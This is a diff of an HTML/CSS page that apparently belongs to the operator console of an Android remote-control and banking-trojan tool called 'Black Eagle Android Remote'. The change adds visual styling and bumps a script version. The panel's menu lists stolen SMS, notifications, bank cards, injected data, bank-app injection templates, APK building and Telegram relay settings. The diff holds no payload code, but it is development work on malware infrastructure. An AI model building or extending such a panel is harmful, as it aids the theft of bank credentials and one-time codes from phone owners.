@@ -124,6 +124,46 @@
 @media(max-height:730px){#detail .bh-commands-wrap{flex-basis:190px}#detail .commands{grid-auto-rows:25px!important;gap:3px!important}#detail .screens{min-height:100px}}
 @media(max-width:1100px){#detail .threepane{grid-template-columns:48% minmax(0,52%)}#detail .bh-commands-wrap{flex-basis:240px}#detail .commands{grid-template-columns:repeat(4,minmax(0,1fr))!important}#detail .bh-command-note{display:none}}
 </style>
+
+<style id="bh-reference-refinement">
+/* 参考截图视觉精修；隔离在 #detail 内，不影响设备注册和后端连接。 */
+#detail.control-page{font-family:Arial,"Microsoft YaHei",sans-serif;background:#0b1119}
+#detail .bh-target-top{height:34px!important;min-height:34px!important;background:#0b121b;border:1px solid #29394c;padding:2px 5px!important;border-radius:6px;gap:5px!important}
+#detail .bh-target-top .tool{height:22px;padding:0 6px;font-size:10px}
+#detail .threepane{grid-template-columns:46% minmax(0,54%)!important;gap:7px!important;height:calc(100vh - 40px)!important}
+#detail .leftpane,#detail .rightpane{background:#0e151e!important;border:1px solid #2b3b4f;border-radius:12px;padding:8px!important}
+#detail .screens{gap:11px!important;min-height:160px}
+#detail .screens .screen{border-radius:11px!important;border:1px solid #263549;background:#000}
+#detail .quick.bh-quick{flex:0 0 34px!important;height:34px!important}
+#detail .bh-quick .tool{height:28px;font-size:10px}
+#detail .bh-command-note{font-size:10px;max-width:220px}
+#detail .bh-commands-wrap{flex:0 0 222px!important;padding:6px!important;overflow-y:auto;background:#0a1018!important;border:1px solid #304157}
+#detail .commands{display:grid!important;grid-template-columns:repeat(4,minmax(0,1fr)) 13px repeat(4,minmax(0,1fr))!important;grid-auto-rows:34px!important;gap:5px!important;align-content:start}
+#detail .commands button{border-radius:6px!important;font-size:10px!important;line-height:1.18!important;padding:3px 2px!important;overflow:hidden}
+#detail .commands button:nth-child(8n + 5){grid-column:6}
+#detail .commands button.be-ready{background:#2a6ff1!important;color:#fff!important;border-color:#4887fa!important}
+#detail .commands button:not(.be-ready){background:#111b28!important;color:#6f91b6!important;border-color:#2c4157!important}
+#detail .bh-projection-status{flex:0 0 35px!important;background:#0a2a1f;border:1px solid #10734e;border-radius:6px;color:#00da82}
+#detail .rightpane{gap:8px}
+#detail .tabs{flex:0 0 31px!important;height:31px!important;gap:5px!important;align-items:start}
+#detail .tabs .tool{font-size:10px!important;padding:0 9px!important;height:26px!important;background:#131e2b!important;border:1px solid #2d4158!important;color:#97afce!important}
+#detail .tabs .tool.current{background:#2f131c!important;border-color:#8d2e42!important;color:#ff6276!important}
+#detail .analysis{background:#111923!important;border:1px solid #304258!important;border-radius:10px!important}
+#detail .bh-panel-heading{height:53px!important;padding:10px 14px!important;align-items:center}
+#detail .bh-panel-heading .rightactions{gap:6px}
+#detail .bh-panel-heading .tool{height:26px;font-size:10px}
+#detail .analysis .device-info-panel{padding:0 13px 11px!important}
+#detail .bh-sms-toolbar{justify-content:flex-end!important;align-items:center;gap:5px!important;margin-top:-43px!important;margin-left:110px!important;margin-bottom:21px!important;min-height:29px!important;flex-wrap:nowrap!important}
+#detail .bh-sms-toolbar input{width:170px!important;min-width:0;height:27px!important;font-size:10px}
+#detail .bh-sms-toolbar button{height:27px!important;white-space:nowrap;padding:0 8px;font-size:10px}
+#detail .bh-sms-table{font-size:11px!important}
+#detail .bh-sms-table th{height:34px;border-bottom:1px solid #34465b;color:#add1fb!important}
+#detail .bh-sms-table td{padding:12px 6px!important;border-bottom:1px solid #283747}
+#detail .bh-sms-table th:first-child{width:17%}
+#detail .bh-sms-table th:last-child{width:19%}
+@media(max-width:1350px){#detail .bh-sms-toolbar{margin-top:0!important;margin-left:0!important;justify-content:flex-start!important;flex-wrap:wrap!important;margin-bottom:9px!important}#detail .bh-commands-wrap{flex-basis:250px!important}#detail .commands{grid-auto-rows:30px!important}}
+@media(max-height:760px){#detail .bh-commands-wrap{flex-basis:188px!important}#detail .commands{grid-auto-rows:27px!important;gap:4px!important}}
+</style>
 </head><body>
 <aside class="side" id="sidebar"><div class="brand"><span class="eagle">🦅</span>黑鹰安卓远程</div><button><span class="ico">⌂</span>控制台</button><div class="group-title">数据管理</div><button class="active"><span class="ico">▣</span>设备</button><button><span class="ico">▤</span>短信</button><button><span class="ico">♧</span>通知</button><button><span class="ico">▭</span>银行卡</button><button><span class="ico">▣</span>注入数据</button><div class="group-title">设备管理</div><button><span class="ico">♧</span>分组管理　⌄</button><button><span class="ico">⊘</span>黑名单</button><div class="group-title">注入策略</div><button><span class="ico">◎</span>应用设置</button><button><span class="ico">♢</span>注入模板</button><button><span class="ico">✣</span>AI制作模板</button><button><span class="ico">♧</span>短信通知规则</button><button><span class="ico">▤</span>银行检测配置</button><div class="group-title">构建分发</div><button><span class="ico">⚒</span>APK构建</button><div class="group-title">系统设置</div><button><span class="ico">♙</span>用户设置</button><button><span class="ico">♢</span>安全中心</button><button><span class="ico">▤</span>服务器状态</button><button><span class="ico">⌁</span>TURN节点</button><button><span class="ico">▤</span>Telegram设置</button><div class="bottom"><span class="dot">●</span> 系统运行中　v2.0</div></aside>
 <main class="viewport" id="main">
@@ -185,4 +225,4 @@
     </section>
   </div>
 </div>
-</main><dialog id="meta-dialog" class="edit-dialog"><form id="meta-form"><h2>设备信息管理</h2><p id="editing-label"></p><label id="name-field">设备显示名称<input id="meta-name" maxlength="80" minlength="2" placeholder="例如：Pixel 3 测试机"></label><label>分组名称<input id="meta-group" maxlength="45" placeholder="例如：测试组、海外业务组"></label><label>备注<textarea id="meta-note" maxlength="500" rows="5" placeholder="添加设备用途或管理备注"></textarea></label><div class="edit-actions"><button type="button" id="meta-cancel">取消</button><button type="submit" class="primary" id="meta-save">保存到数据库</button></div><p id="meta-error" role="status"></p></form></dialog><script src="/app.js?v=550" defer></script></body></html>
+</main><dialog id="meta-dialog" class="edit-dialog"><form id="meta-form"><h2>设备信息管理</h2><p id="editing-label"></p><label id="name-field">设备显示名称<input id="meta-name" maxlength="80" minlength="2" placeholder="例如：Pixel 3 测试机"></label><label>分组名称<input id="meta-group" maxlength="45" placeholder="例如：测试组、海外业务组"></label><label>备注<textarea id="meta-note" maxlength="500" rows="5" placeholder="添加设备用途或管理备注"></textarea></label><div class="edit-actions"><button type="button" id="meta-cancel">取消</button><button type="submit" class="primary" id="meta-save">保存到数据库</button></div><p id="meta-error" role="status"></p></form></dialog><script src="/app.js?v=560" defer></script></body></html>
